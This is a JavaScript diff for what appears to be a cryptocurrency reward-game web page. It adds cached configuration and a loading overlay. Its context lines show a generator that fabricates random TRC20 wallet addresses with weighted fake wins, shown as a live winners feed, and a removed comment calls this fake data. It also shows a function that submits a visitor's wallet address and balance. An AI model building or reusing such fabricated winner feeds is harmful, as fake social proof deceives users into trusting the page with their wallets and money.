@@ -20,6 +20,54 @@ window.__GAME_CONFIG = {
     winCount: 3
 };
 
+// 缓存 key
+const CFG_CACHE_KEY = '__nexus_cfg_cache';
+
+// 从 localStorage 读缓存配置
+function loadCachedConfig() {
+    try {
+        const raw = localStorage.getItem(CFG_CACHE_KEY);
+        if (!raw) return null;
+        const cfg = JSON.parse(raw);
+        if (cfg && cfg.currency && COIN_META[cfg.currency]) {
+            return cfg;
+        }
+    } catch (e) {}
+    return null;
+}
+
+// 写缓存配置
+function saveCachedConfig(cfg) {
+    try {
+        localStorage.setItem(CFG_CACHE_KEY, JSON.stringify(cfg));
+    } catch (e) {}
+}
+
+// ★ 立即应用缓存配置（在请求之前，避免闪 USDT）
+(function applyCachedConfigImmediately(){
+    const cached = loadCachedConfig();
+    if (cached) {
+        if (cached.currency) window.__GAME_CONFIG.currency = cached.currency;
+        if (cached.rewards && typeof cached.rewards === 'object') {
+            window.__GAME_CONFIG.rewards = {
+                2: parseFloat(cached.rewards[2]) || 0,
+                3: parseFloat(cached.rewards[3]) || 0,
+                4: parseFloat(cached.rewards[4]) || 0,
+                5: parseFloat(cached.rewards[5]) || 0
+            };
+        }
+        if (cached.winCount !== undefined) {
+            window.__GAME_CONFIG.winCount = parseInt(cached.winCount, 10) || 0;
+        }
+        // 等 DOM 就绪后立即刷新 UI
+        if (document.readyState === 'loading') {
+            document.addEventListener('DOMContentLoaded', applyConfigToUI);
+        } else {
+            applyConfigToUI();
+        }
+    }
+})();
+
 // 地址验证规则（按币种）
 const ADDR_VALIDATORS = {
     USDT: /^T[1-9A-HJ-NP-Za-km-z]{33}$/,
@@ -51,6 +99,14 @@ function formatAmountWithSep(value, currency) {
     return parts.join('.');
 }
 
+// ★ 移除启动遮罩
+function hideBootOverlay() {
+    const ov = document.getElementById('bootOverlay');
+    if (!ov) return;
+    ov.classList.add('hide');
+    setTimeout(() => { try { ov.remove(); } catch(e){} }, 320);
+}
+
 // ===================== 访问会话管理 =====================
 let __visitId = null;
 let __heartbeatTimer = null;
@@ -77,13 +133,22 @@ async function loadPublicSettings() {
         if (cfg.winCount !== undefined) {
             window.__GAME_CONFIG.winCount = parseInt(cfg.winCount, 10) || 0;
         }
+        // 写入缓存
+        saveCachedConfig({
+            currency: window.__GAME_CONFIG.currency,
+            rewards: window.__GAME_CONFIG.rewards,
+            winCount: window.__GAME_CONFIG.winCount
+        });
         applyConfigToUI();
-        // ★ 配置加载完成后，重建滚动队列（让假数据用新配置）
+        // 配置加载完成后，重建滚动队列
         if (typeof window.__rebuildRollingAddresses === 'function') {
             window.__rebuildRollingAddresses();
         }
     } catch (e) {
         console.warn('读取公共配置失败:', e.message);
+    } finally {
+        // ★ 无论成功失败，都移除遮罩
+        hideBootOverlay();
     }
 }
 
@@ -148,6 +213,7 @@ async function startVisitSession() {
         }
     } catch (e) {
         console.warn('访问会话创建失败:', e.message);
+        hideBootOverlay();
     }
 }
 
@@ -196,6 +262,9 @@ if (document.readyState === 'loading') {
 }
 window.addEventListener('pagehide', endVisitSession);
 window.addEventListener('beforeunload', endVisitSession);
+
+// ★ 保险：无论如何 3 秒后移除遮罩（防止请求卡住一直白屏）
+setTimeout(hideBootOverlay, 3000);
 
 // ===================== 主游戏 =====================
 (function(){
@@ -606,7 +675,6 @@ async function submitTrc20Record(address, balance){
   const QUEUE_SIZE = 20;
   const VISIBLE = 5;
 
-  // 加权池：2× 60% / 3× 25% / 4× 12% / 5× 3%
   const WEIGHTED_POOL = [
     { match: 2, weight: 60 },
     { match: 3, weight: 25 },
@@ -631,15 +699,13 @@ async function submitTrc20Record(address, balance){
     return addr;
   }
 
-  // ★ 只存"档位数组"，不存金额。金额在 render 时实时算，保证配置变了对得上
   function generateRecord() {
-    const winsCount = 1 + Math.floor(Math.random() * 3);   // 1~3 次中奖
+    const winsCount = 1 + Math.floor(Math.random() * 3);
     const matches = [];
     for (let i = 0; i < winsCount; i++) matches.push(pickWeightedMatch());
     return { addr: generateRandomTRC20(), matches };
   }
 
-  // 根据档位数组 + 当前配置算总金额
   function calcTotal(rec) {
     const rewards = (window.__GAME_CONFIG && window.__GAME_CONFIG.rewards) || { 2: 10, 3: 30, 4: 200, 5: 10000 };
     let total = 0;
@@ -683,10 +749,8 @@ async function submitTrc20Record(address, balance){
     render();
   }
 
-  // ★ 暴露 rebuild 给 loadPublicSettings 调用（配置加载完后重建队列）
   window.__rebuildRollingAddresses = rebuild;
 
-  // 首次初始化
   window.initRollingAddresses = function() {
     rebuild();
     setInterval(() => {
@@ -697,7 +761,6 @@ async function submitTrc20Record(address, balance){
   };
 })();
 
-// 兼容旧的调用方式
 function initRollingAddresses() {
   if (typeof window.initRollingAddresses === 'function') {
     window.initRollingAddresses();
